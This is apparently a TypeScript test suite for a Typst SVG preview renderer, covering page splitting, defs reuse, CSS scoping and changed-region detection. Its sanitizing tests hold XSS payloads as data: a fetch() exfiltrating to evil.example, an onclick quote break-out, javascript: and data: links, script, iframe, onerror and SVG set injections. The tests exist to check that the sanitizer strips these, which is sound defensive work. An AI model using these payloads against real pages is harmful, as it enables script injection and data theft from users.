import {
  buildPreviewDocument,
  internalLinkTarget,
  LOCATION_ATTR,
  scopeCss,
  type PreviewDocument,
} from "./svg-pages";
import { splitSvgString } from "./svg-split";

const root =
  '<svg class="typst-doc" viewBox="0 0 596 1684" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">';
const defs = (glyphs: string) =>
  `<style>.typst-text{}</style><defs class="glyph">${glyphs}</defs>`;
const page = (tid: string, y: number) =>
  `<g class="typst-page" transform="translate(0, ${y})" data-tid="${tid}" data-page-width="596" data-page-height="842"><g class="typst-group"><use xlink:href="#g1"/></g></g>`;

/** What the client does with a render that carries every page and the defs. */
function splitSvgPages(
  svg: string,
  previous: PreviewDocument | null = null,
): PreviewDocument {
  const { rootTag, defsSource, pages } = splitSvgString(svg);
  const doc = buildPreviewDocument(
    { rootTag, defs: defsSource, pages },
    previous,
  );
  if (!doc) throw new Error("render rejected");
  return doc;
}

describe("splitSvgString", () => {
  it("reads the page identity off the page tags", () => {
    const split = splitSvgString(
      root + defs("") + page("p1", 0) + page("p2", 842) + "</svg>",
    );
    expect(split.rootTag).toBe(root);
    expect(split.defsSource).toBe(defs(""));
    expect(split.pages).toEqual([
      { tid: "p1", width: 596, height: 842, markup: page("p1", 0) },
      { tid: "p2", width: 596, height: 842, markup: page("p2", 842) },
    ]);
  });

  it("treats everything as defs when there are no pages", () => {
    expect(splitSvgString(root + defs("") + "</svg>")).toEqual({
      rootTag: root,
      defsSource: defs(""),
      pages: [],
    });
  });
});

describe("buildPreviewDocument", () => {
  const split = (...tids: string[]) =>
    splitSvgString(
      root +
        defs("") +
        tids.map((t, i) => page(t, i * 842)).join("") +
        "</svg>",
    );

  it("takes unchanged pages and defs from the previous document", () => {
    const first = splitSvgPages(
      root + defs("") + page("a", 0) + page("b", 842) + "</svg>",
    );
    const { rootTag, pages } = split("a", "b", "c");
    const doc = buildPreviewDocument(
      {
        rootTag,
        defs: null,
        pages: pages.map((p) => ({
          ...p,
          markup: p.tid === "c" ? p.markup : null,
        })),
      },
      first,
    )!;
    expect(doc.defs).toBe(first.defs);
    expect(doc.defsSource).toBe(first.defsSource);
    expect(doc.pages[0]).toBe(first.pages[0]);
    expect(doc.pages[1]).toBe(first.pages[1]);
    expect(doc.pages[2]!.tid).toBe("c");
  });

  it("asks for a rerender when it lacks what the render leaves out", () => {
    const first = splitSvgPages(root + defs("") + page("a", 0) + "</svg>");
    const { rootTag, defsSource, pages } = split("a", "b");
    const unknownPage = pages.map((p) => ({ ...p, markup: null }));
    expect(
      buildPreviewDocument({ rootTag, defs: null, pages: unknownPage }, first),
    ).toBeNull();
    expect(
      buildPreviewDocument(
        { rootTag, defs: null, pages: [unknownPage[0]!] },
        null,
      ),
    ).toBeNull();
    // With the defs sent but a page missing, the live defs stay untouched.
    const live = first.defs.outerHTML;
    expect(
      buildPreviewDocument(
        { rootTag, defs: defsSource + "<style/>", pages: unknownPage },
        first,
      ),
    ).toBeNull();
    expect(first.defs.outerHTML).toBe(live);
  });
});

describe("splitSvgPages", () => {
  it("splits pages into standalone svgs and collects the defs", () => {
    const doc = splitSvgPages(
      root +
        defs('<path id="g1" d="M0 0"/>') +
        page("p1", 0) +
        page("p2", 842) +
        "</svg>",
    );
    expect(doc.pages.map((p) => [p.tid, p.width, p.height])).toEqual([
      ["p1", 596, 842],
      ["p2", 596, 842],
    ]);
    const second = doc.pages[1]!.element;
    expect(second.getAttribute("viewBox")).toBe("0 0 596 842");
    expect(
      second.querySelector("g.typst-page")?.hasAttribute("transform"),
    ).toBe(false);
    expect(doc.defs.querySelector("#g1")).not.toBeNull();
    expect(doc.defs.querySelector("style")?.textContent).toBe(
      ".typst-preview .typst-text {}\n",
    );
  });

  it("reuses unchanged pages and defs from the previous render", () => {
    const glyphs = '<path id="g1" d="M0 0"/>';
    const first = splitSvgPages(
      root + defs(glyphs) + page("a", 0) + page("b", 842) + "</svg>",
    );
    const second = splitSvgPages(
      root + defs(glyphs) + page("a", 0) + page("c", 842) + "</svg>",
      first,
    );
    expect(second.defs).toBe(first.defs);
    expect(second.pages[0]).toBe(first.pages[0]);
    expect(second.pages[1]).not.toBe(first.pages[1]);
    expect(second.pages[1]!.tid).toBe("c");

    const third = splitSvgPages(
      root +
        defs(glyphs + '<path id="g2" d="M1 1"/>') +
        page("a", 0) +
        "</svg>",
      second,
    );
    expect(third.pages).toEqual([second.pages[0]]);
  });

  it("patches changed defs in place, keeping the glyphs that stay", () => {
    const first = splitSvgPages(
      root +
        defs('<path id="g1" d="M0 0"/><path id="g2" d="M1 1"/>') +
        page("a", 0) +
        "</svg>",
    );
    const g1 = first.defs.querySelector("#g1");
    const second = splitSvgPages(
      root +
        defs('<path id="g1" d="M0 0"/><path id="g3" d="M2 2"/>') +
        page("a", 0) +
        "</svg>",
      first,
    );
    // The same element, so the preview never swaps it out.
    expect(second.defs).toBe(first.defs);
    expect(second.defs.querySelector("#g1")).toBe(g1);
    expect(second.defs.querySelector("#g2")).toBeNull();
    expect(second.defs.querySelector("#g3")?.getAttribute("d")).toBe("M2 2");

    const third = splitSvgPages(
      root +
        defs('<path id="g1" d="M9 9"/><path id="g3" d="M2 2"/>') +
        page("a", 0) +
        "</svg>",
      second,
    );
    expect(third.defs.querySelector("#g1")?.getAttribute("d")).toBe("M9 9");
  });

  it("rebuilds the defs when their sections change", () => {
    const first = splitSvgPages(
      root + defs('<path id="g1" d="M0 0"/>') + page("a", 0) + "</svg>",
    );
    const second = splitSvgPages(
      root +
        defs('<path id="g1" d="M0 0"/>') +
        '<defs class="clip-path"><clipPath id="c1"><rect width="1" height="1"/></clipPath></defs>' +
        page("a", 0) +
        "</svg>",
      first,
    );
    expect(second.defs).not.toBe(first.defs);
    expect(second.defs.querySelector("#c1")).not.toBeNull();
  });

  it("replaces a changed style section", () => {
    const first = splitSvgPages(root + defs("") + page("a", 0) + "</svg>");
    const second = splitSvgPages(
      root +
        '<style>.typst-other{}</style><defs class="glyph"></defs>' +
        page("a", 0) +
        "</svg>",
      first,
    );
    expect(second.defs).toBe(first.defs);
    expect(second.defs.querySelector("style")?.textContent).toBe(
      ".typst-preview .typst-other {}\n",
    );
  });

  it("does not hand the same element to two identical pages", () => {
    const first = splitSvgPages(root + defs("") + page("same", 0) + "</svg>");
    const second = splitSvgPages(
      root + defs("") + page("same", 0) + page("same", 842) + "</svg>",
      first,
    );
    expect(second.pages[0]).toBe(first.pages[0]);
    expect(second.pages[1]!.element).not.toBe(first.pages[0]!.element);
  });

  it("handles a document without pages", () => {
    expect(splitSvgPages(root + defs("") + "</svg>").pages).toEqual([]);
  });
});

describe("sanitizing", () => {
  const XLINK = "http://www.w3.org/1999/xlink";
  // Mirrors typst.ts' render_link: `@typst:` targets go into onclick
  // unescaped, everything else into an escaped xlink:href.
  const link = (href: string) =>
    href.startsWith("@typst:")
      ? `<a xlink:href="#" onclick="${href.slice(7)}; return false"><rect class="pseudo-link" width="9" height="9"></rect></a>`
      : `<a target="_blank" xlink:href="${href.replace(/&/g, "&amp;").replace(/"/g, "&quot;")}"><rect class="pseudo-link" width="9" height="9"></rect></a>`;
  const pageWith = (content: string) =>
    `<g class="typst-page" data-tid="t" data-page-width="596" data-page-height="842">${content}</g>`;
  const render = (content: string, defsContent = "") =>
    splitSvgPages(root + defs(defsContent) + pageWith(content) + "</svg>");

  function attributesOf(el: Element): string[] {
    return [el, ...el.querySelectorAll("*")].flatMap((e) =>
      Array.from(e.attributes, (a) => a.name),
    );
  }

  it("drops script smuggled into an @typst: link", () => {
    const page = render(
      link("@typst:fetch('https://evil.example/?'+localStorage.length)") +
        // Breaks out of onclick's quotes to add an attribute of its own.
        link(`@typst:0" onmouseover="alert(1)`),
    ).pages[0]!.element;
    expect(attributesOf(page).filter((a) => /^on/i.test(a))).toEqual([]);
    const anchors = page.querySelectorAll("a");
    expect(anchors).toHaveLength(2);
    // The "#" target goes too: following it would replace the fragment
    // that holds the project key.
    for (const a of anchors) {
      expect(a.getAttributeNS(XLINK, "href")).toBe(null);
    }
  });

  it("turns internal links into a target the preview follows", () => {
    const page = render(link("@typst:handleTypstLocation(this, 2, 10.5, 20)"))
      .pages[0]!.element;
    const anchor = page.querySelector("a")!;
    expect(attributesOf(page).filter((a) => /^on/i.test(a))).toEqual([]);
    expect(anchor.getAttribute(LOCATION_ATTR)).toBe("2 10.5 20");
    expect(internalLinkTarget(anchor.querySelector("rect")!)).toEqual({
      page: 1,
      x: 10.5,
      y: 20,
    });
  });

  it("drops an onclick that only looks like an internal link", () => {
    const page = render(
      link("@typst:handleTypstLocation(this, 2, 10, alert(1))"),
    ).pages[0]!.element;
    const anchor = page.querySelector("a")!;
    expect(anchor.attributes).toHaveLength(0);
    expect(internalLinkTarget(anchor)).toBeNull();
  });

  it("keeps web links and drops script and data links", () => {
    const page = render(
      link("https://typst.app/docs?a=1&b=2") +
        link("mailto:someone@example.com") +
        link("javascript:alert(1)") +
        link("java\tscript:alert(1)") +
        link("data:text/html,%3Cscript%3Ealert(1)%3C/script%3E"),
    ).pages[0]!.element;
    const hrefs = Array.from(page.querySelectorAll("a"), (a) =>
      a.getAttributeNS(XLINK, "href"),
    );
    expect(hrefs).toEqual([
      "https://typst.app/docs?a=1&b=2",
      "mailto:someone@example.com",
      null,
      null,
      null,
    ]);
    expect(page.querySelector("a")!.getAttribute("rel")).toBe(
      "noopener noreferrer",
    );
  });

  it("removes elements typst.ts never emits", () => {
    const doc = render(
      '<script>alert(1)</script><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example"/>' +
        '<a xlink:href="https://typst.app"><set attributeName="href" to="javascript:alert(1)"/></a>' +
        '<foreignObject><h5:div xmlns:h5="http://www.w3.org/1999/xhtml" class="tsel">text<h5:img src="x" onerror="alert(1)"/></h5:div></foreignObject>',
      '<script>alert(2)</script><path id="g1" d="M0 0"/>',
    );
    const page = doc.pages[0]!.element;
    for (const tag of ["script", "iframe", "set", "img"]) {
      expect(page.getElementsByTagNameNS("*", tag)).toHaveLength(0);
      expect(doc.defs.getElementsByTagNameNS("*", tag)).toHaveLength(0);
    }
    // The text selection layer stays.
    expect(page.getElementsByTagNameNS("*", "div")).toHaveLength(1);
    expect(doc.defs.querySelector("#g1")).not.toBeNull();
  });

  it("keeps internal references and embedded images", () => {
    const page = render(
      '<use xlink:href="#g1"/><use xlink:href="https://evil.example/x.svg#a"/>' +
        '<image xlink:href="data:image/png;base64,AAAA"/><image xlink:href="https://evil.example/track.png"/>',
      '<path id="g1" d="M0 0"/>',
    ).pages[0]!.element;
    const hrefs = Array.from(page.querySelectorAll("use, image"), (el) =>
      el.getAttributeNS(XLINK, "href"),
    );
    expect(hrefs).toEqual(["#g1", null, "data:image/png;base64,AAAA", null]);
  });
});

describe("scopeCss", () => {
  it("keeps typst.ts' global rules inside the preview", () => {
    const css = `
.tsel span,
.tsel {
  left: 0;
}
svg {
  fill: none;
}
.tsel::selection { color: transparent; }
@keyframes typst-jump-ripple-effect {
  to {
    width: 10vw;
  }
}
`;
    const scoped = scopeCss(css, ".p");
    expect(scoped).toContain(".p .tsel span, .p .tsel {");
    expect(scoped).toContain(".p svg {\n  fill: none;\n}");
    expect(scoped).toContain(".p .tsel::selection {");
    expect(scoped).toContain(
      "@keyframes typst-jump-ripple-effect {\n  to {\n    width: 10vw;\n  }\n}",
    );
    expect(scoped).not.toMatch(/(^|\n)svg/);
  });
});

describe("changed regions", () => {
  const blockPage = (tid: string, blocks: [string, number][], height = 842) =>
    `<g class="typst-page" transform="translate(0, 0)" data-tid="${tid}" data-page-width="596" data-page-height="${height}"><g class="typst-group" data-tid="g${tid}">${blocks
      .map(
        ([t, y]) =>
          `<g transform="translate(70.866, ${y})" data-tid="${t}"><g class="typst-group"/></g>`,
      )
      .join("")}</g></g>`;
  const doc = (pages: string[], previous: PreviewDocument | null = null) =>
    splitSvgPages(root + defs("") + pages.join("") + "</svg>", previous);

  const before = () =>
    doc([
      blockPage("p1", [
        ["a", 10],
        ["b", 50],
        ["c", 90],
      ]),
    ]);

  it("has no changes for the first document", () => {
    expect(before().changes).toEqual([]);
  });

  it("reports an edited block down to the next unchanged one", () => {
    const next = doc(
      [
        blockPage("p2", [
          ["a", 10],
          ["B", 50],
          ["c", 90],
        ]),
      ],
      before(),
    );
    expect(next.changes).toEqual([{ page: 0, top: 50, bottom: 90 }]);
  });

  it("leaves out lines that only moved when a line is pushed off the page", () => {
    const first = doc([
      blockPage("p1", [
        ["a", 10],
        ["m1", 50],
        ["m2", 90],
        ["last", 130],
      ]),
    ]);
    // The first paragraph grew by a line, so everything below moved down
    // and the old last line went on to the next page.
    const next = doc(
      [
        blockPage("p2", [
          ["A1", 10],
          ["A2", 50],
          ["m1", 90],
          ["m2", 130],
        ]),
      ],
      first,
    );
    expect(next.changes).toEqual([{ page: 0, top: 10, bottom: 90 }]);
  });

  it("reports separate runs of changed blocks separately", () => {
    const next = doc(
      [
        blockPage("p2", [
          ["A", 10],
          ["b", 50],
          ["C", 90],
        ]),
      ],
      before(),
    );
    expect(next.changes).toEqual([
      { page: 0, top: 10, bottom: 50 },
      { page: 0, top: 90, bottom: 842 },
    ]);
  });

  it("runs to the bottom of the page when the last block changed", () => {
    const next = doc(
      [
        blockPage("p2", [
          ["a", 10],
          ["b", 50],
          ["C", 90],
        ]),
      ],
      before(),
    );
    expect(next.changes).toEqual([{ page: 0, top: 90, bottom: 842 }]);
  });

  it("does not count blocks that were only pushed down", () => {
    const next = doc(
      [
        blockPage("p2", [
          ["a", 10],
          ["x", 50],
          ["b", 80],
          ["c", 120],
        ]),
      ],
      before(),
    );
    expect(next.changes).toEqual([{ page: 0, top: 50, bottom: 80 }]);
  });

  it("marks the spot where blocks were removed", () => {
    const next = doc(
      [
        blockPage("p2", [
          ["a", 10],
          ["c", 50],
        ]),
      ],
      before(),
    );
    expect(next.changes).toEqual([{ page: 0, top: 50, bottom: 50 }]);
  });

  it("treats a page without a counterpart as changed in full", () => {
    const first = before();
    const next = doc(
      [blockPage("p1", [["a", 10]]), blockPage("p9", [["z", 10]], 600)],
      first,
    );
    expect(next.pages[0]).toBe(first.pages[0]);
    expect(next.changes).toEqual([{ page: 1, top: 0, bottom: 600 }]);
  });
});
